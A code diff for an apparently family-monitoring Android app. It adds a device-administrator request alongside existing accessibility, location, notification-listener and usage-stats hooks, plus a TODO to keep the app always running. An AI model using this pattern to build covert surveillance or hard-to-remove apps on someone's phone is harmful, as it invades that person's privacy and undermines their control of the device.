@@ -14,6 +14,8 @@ import android.app.Activity;
 import android.app.AppOpsManager;
 import android.app.NotificationChannel;
 import android.app.NotificationManager;
+import android.app.admin.DevicePolicyManager;
+import android.content.ComponentName;
 import android.content.ContentResolver;
 import android.content.Context;
 import android.content.Intent;
@@ -37,6 +39,7 @@ import android.widget.Toast;
 import android.os.Bundle;
 
 import com.family.accessibility.MyAccessibilityService;
+import com.family.adminstrator.Adminstrator;
 import com.family.location.LocationService;
 
 import java.util.List;
@@ -141,7 +144,13 @@ public class MainActivity extends AppCompatActivity {
 //            Log.d("salam", "garanted");
 //        }
 
-        setNotificationAccess();
+        //setNotificationAccess();
+
+
+        setAdmin();
+
+
+        //TODO Ignore Battery Optimisation. App Always in running
 
     }
 
@@ -160,8 +169,26 @@ public class MainActivity extends AppCompatActivity {
                     Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS).setFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
         }
 
+    }
 
+    DevicePolicyManager mDPM;
+    ComponentName mDeviceAdmin;
+    //https://stackoverflow.com/questions/30130163/enable-device-admin-dialog-not-showing
+    public void setAdmin() {
+        //https://developer.android.com/guide/topics/admin/device-admin
+        mDPM = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
+        mDeviceAdmin = new ComponentName(this, Adminstrator.class);
 
+        if(mDPM != null &&mDPM.isAdminActive(mDeviceAdmin)) {
+            Log.d("salam", "Active");
+        }else {
+            Log.d("salam", "Not Active");
+
+            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
+            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, mDeviceAdmin);
+            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "EXPLANATION");
+            startActivityForResult(intent, 14);
+        }
     }
     public boolean isUssageS() {
         AppOpsManager appOps = null;
